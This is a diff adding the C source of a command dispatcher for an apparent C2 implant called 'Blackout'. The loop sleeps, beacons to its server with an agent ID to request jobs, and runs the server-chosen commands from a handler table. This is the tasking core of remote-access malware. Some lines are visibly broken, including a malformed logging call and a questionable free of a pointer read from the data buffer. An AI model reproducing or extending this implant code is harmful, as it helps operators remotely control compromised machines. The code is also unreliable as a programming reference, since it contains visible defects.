@@ -1,0 +1,74 @@
+#include <Common.h>
+
+FUNC VOID CommandDispatcher()
+{
+    BLACKOUT_INSTANCE
+
+    PPACKAGE Package     = NULL;
+    PARSER   Parser      = { 0 };
+    PVOID    DataBuffer  = NULL;
+    SIZE_T   DataSize    = 0;
+    DWORD    TaskCommand = 0;
+
+    Instance(). ( "Command Dispatcher..." );
+
+    do
+    {
+        if ( !Blackout.Session.Connected )
+            return;
+
+        Sleep( Blackout.Config.Sleeping * 1000 );
+
+        Package = PackageCreate( COMMAND_GET_JOB );
+
+        PackageAddInt32( Package, Blackout.Session.AgentID );
+        PackageTransmit( Package, &DataBuffer, &DataSize );
+
+        if ( DataBuffer && DataSize > 0 )
+        {
+            PRINT_HEX( DataBuffer, DataSize )
+
+            ParserNew( &Parser, DataBuffer, DataSize );
+            do
+            {
+                TaskCommand = ParserGetInt32( &Parser );
+
+                if ( TaskCommand != COMMAND_NO_JOB )
+                {
+                    printf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );
+
+                    BOOL FoundCommand = FALSE;
+                    for ( UINT32 FunctionCounter = 0; FunctionCounter < BLACKOUT_COMMAND_LENGTH; FunctionCounter++ )
+                    {
+                        if ( Commands[ FunctionCounter ].ID == TaskCommand )
+                        {
+                            Commands[ FunctionCounter ].Function( &Parser );
+                            FoundCommand = TRUE;
+                            break;
+                        }
+                    }
+
+                    if ( ! FoundCommand )
+                        puts( "Command not found !!" );
+
+                } else puts( "Is COMMAND_NO_JOB" );
+
+            } while ( Parser.Length > 4 );
+
+            memset( DataBuffer, 0, DataSize );
+            LocalFree( *( PVOID* ) DataBuffer );
+            DataBuffer = NULL;
+
+            ParserDestroy( &Parser );
+
+        }
+        else
+        {
+            puts( "Transport: Failed" );
+            break;
+        }
+
+    } while ( TRUE );
+
+    Blackout.Session.Connected = FALSE;
+}
